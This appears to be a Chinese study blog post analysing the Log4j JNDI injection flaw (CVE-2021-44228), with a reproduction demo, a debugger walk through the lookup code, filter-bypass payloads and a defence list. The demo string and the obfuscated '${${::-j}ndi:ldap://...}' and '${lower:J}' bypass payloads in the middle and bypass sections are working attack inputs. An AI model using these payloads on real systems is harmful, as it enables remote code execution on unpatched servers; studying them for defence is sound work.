---
title: "Log4j漏洞"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# Log4j漏洞

在https://yuy0ung.github.io/blog/java%E5%AE%89%E5%85%A8/%E7%BB%8F%E5%85%B8%E6%BC%8F%E6%B4%9E/jndi%E6%B3%A8%E5%85%A5/，学习了JNDI注入，现在来学一个很经典的JNDI注入：Log4j

Log4j支持lookup功能（看到这个就知道要打 jndi ）。例如当开发者想在日志中打印今天的日期，则只需要输出`${data:MM-dd-yyyy}`，此时log4j会将${}中包裹的内容单独处理，将它识别为日期查找，然后将该表达式替换为今天的日期内容输出为“08-22-2022”，这样做就不需要开发者自己去编写查找日期的代码。究其根本，还是最后调用触发了 jndi

leader考过我，“这不是一个日志框架么，为什么要支持JNDI查询呢？不是支持日期等基础功能就够了吗？”，后来查阅了一下，Log4j 的 lookup 功能之所以“画蛇添足”地支持 JNDI，早期设计里把它当成一种通用资源定位机制：
开发者想在日志里动态打印任意 Java 对象（数据源、配置项、EJB 引用、JMS 队列名……）时，只要一条 `${jndi:...}` 就能让容器去 JNDI 树里查找，省掉自己再写一套 lookup 代码

## 漏洞复现

在log4j2的2.0-beta9 到 2.15.0（不包括安全版本 2.12.2、2.12.3 和 2.3.1）版本内存在着JNDI注入的CVE-2021-44228

我们先引入漏洞版本的Log4j：

~~~xml
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.14.1</version>
</dependency>
~~~

然后运行这个demo：

~~~java
package com.yuy0ung;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jDemo {
    private static  final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        String username = "${jndi:ldap://localhost:9999/LDAPPoc}";
        logger.error("hello {}",username);
    }
}

~~~

成功执行命令

![QQ_1762156673956](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762156673956.png)

## 漏洞成因

简单来说，log4j 会把 `${}` 包裹的进行特殊处理，最后会触发 lookup

我们调试一下：

跟进到`PatternLayout#toSerializable` 方法，对 `formatters` 进行循环处理：

![QQ_1762223263332](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762223263332.png)

这个类就是将日志内容按 log4j2.xml 文件中规定好的格式那样输出，我们这里的格式为 `[%-5p] %d %c - %m%n` 所以第七次循环就会处理 `%m` 也就是我们的日志消息，会调用到`org.apache.logging.log4j.core.pattern.MessagePatternConverter#format`

循环到第7次时跟进到format方法：

![QQ_1762223666494](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762223666494.png)

我们跟进到第二个if：

![QQ_1762223801654](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762223801654.png)

这里的 `this.config` 就是我们实现log4j2的文件类型，这里是xml，`this.noLookups` 为 false 则代表启用 `${}` 变量替换，这里我们没有在xml中显式规定禁用，所以默认是启用的，而且我们这里本来就需要用到变量替换

然后进入到 if 语句里面，如果检测到 `${` 开头，则取出从 `offset` 到当前 `workingBuilder` 末尾的内容，故这里 value 的值就为当时输入的值：

![QQ_1762223913722](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762223913722.png)

继续跟进 `replace()` 方法，`replace()` 方法里面调用了 `substitute()` 方法，这里就是将 ${} 中间的内容取出来，然后又会调用 `this.subtitute` 来处理。最后调用到 `resolveVariable` 方法：

![QQ_1762224418396](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762224418396.png)

`resolver`解析时支持的关键词有`[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]`，而我们这里利用的`jndi:xxx`后续就会用到`JndiLookup`这个解析器：

![QQ_1762224608901](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762224608901.png)

跟进到解析器的`lookup()`方法，这里同样调用了一个`lookup()`方法：

![QQ_1762224796767](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762224796767.png)

这个 `lookup()` 方法也就是 jndi 里面原生的方法，在我们让 jndi 去调用 rmi 服务的时候，是调用原生的 `lookup()` 方法：

![QQ_1762224735497](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762224735497.png)

那么这里就触发JNDI注入导致命令执行了，整条利用链结束

## bypass

记录一点bypass手段：

递归解析绕过：log4j2 支持表达式递归解析，下面的表达式会逐层解析，由于 `:-`是键值对的分隔符，而表达式只管取值，从而使得  `{::-j}` -> `j`，类似的可以混淆其他字符。

```
loggr.info("${${::-j}ndi:ldap://127.0.0.1:9999/exp}"); logger.info("${${,:-j}ndi:ldap://127.0.0.1:1099/exp}")
```

lowwer / upper 绕过：使用 log4j2 支持的关键字，实现大小写绕过

```fallback
logg.info("${${lower:J}ndi:ldap://127.0.0.1:9999/exp}");
```

## 防御

- 更新log4j至 rc2
- 配置防火墙策略，禁止主动连接外网设备
- 升级受影响的应用及组件
- 过滤相关的关键词，比如`${jndi://*}`
- 限制JNDI默认可以使用的协议
- 限制可以通过LDAP访问的服务器和类